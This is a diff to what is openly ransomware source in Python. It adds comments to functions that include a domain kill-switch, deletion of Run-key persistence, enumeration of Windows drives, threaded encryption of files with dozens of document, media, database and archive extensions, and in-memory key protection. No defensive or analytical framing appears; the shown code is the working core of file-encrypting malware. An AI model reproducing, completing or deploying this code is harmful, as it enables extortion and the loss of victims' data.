@@ -15,10 +15,12 @@ import win32api
 def initial_check_kill():
     connect_counter = 0
     
+    # Try connect to the domain for three times
     while connect_counter < 3:
         try:
-            response = requests.get("http://Hd8heufhfeLSOjOoj33994fh3n2012ndu.com")
+            response = requests.get("http://Hd8heufhfeLSOjOoj33994fh3n2012ndu.com") # Randomly generared domain
             if response.status_code == 200:
+                # Attempt to delete persistance (if active)
                 if "win" in sys.platform.lower():
                     key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                     try:
@@ -28,7 +30,7 @@ def initial_check_kill():
                     except:
                         pass
                 kill_ransomware_file()
-                sys.exit()
+                sys.exit() # Exit program
             else:
                 connect_counter += 1
         except requests.ConnectionError:
@@ -143,6 +145,7 @@ def rename_file_with_counter(file_path, new_extension):
                 break
             file_counter += 1
 
+# List all drives that the OS has (windows related)
 def list_drives():
     drives = win32api.GetLogicalDriveStrings()
     drives = drives.split('\000')[:-1]
@@ -152,6 +155,7 @@ def list_drives():
     
     return drives
 
+# Function to handle the traversal of files and encyrption, files searched for contain critical file extensions
 def traverse_encrypt(drive, key):
     extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv')
     
@@ -160,12 +164,14 @@ def traverse_encrypt(drive, key):
             if any(file.endswith(ext) for ext in extensions):
                 encrypt_file(os.path.join(root, file), key)
 
+# With threading, attept to traverse and encrypt the found files, use system cores to speed up the process
 def parallel_search(drives, key):
     with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
         futures = [executor.submit(traverse_encrypt, drive, key) for drive in drives]
         for future in futures:
             future.result()
 
+# Zero out the key in memory several times
 def zero_memory(buffer):
     length = len(buffer)
     # First pass: write all ones (0xFF)
@@ -175,6 +181,7 @@ def zero_memory(buffer):
     for i in range(length):
         buffer[i] = 0x00
 
+# Attempt to move generated key out of memory
 def key_to_ram(key):
     # Create an anonymous mmap for the key and write the key into it
     key_len = len(key)
@@ -187,6 +194,7 @@ def key_to_ram(key):
 
     return mm, key_len, kernel32
 
+# Zero out the memory and unlock memory again
 def zero_and_unlock(mm, key_len, kernel_memory):
     # Zero out the memory after use
     zero_memory(mm)
@@ -195,6 +203,7 @@ def zero_and_unlock(mm, key_len, kernel_memory):
     kernel_memory.VirtualUnlock(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mm))), ctypes.c_size_t(key_len))
     mm.close()
 
+# Main part, run all functions
 def main():
     initial_check_kill()
     startup_commands_windows()
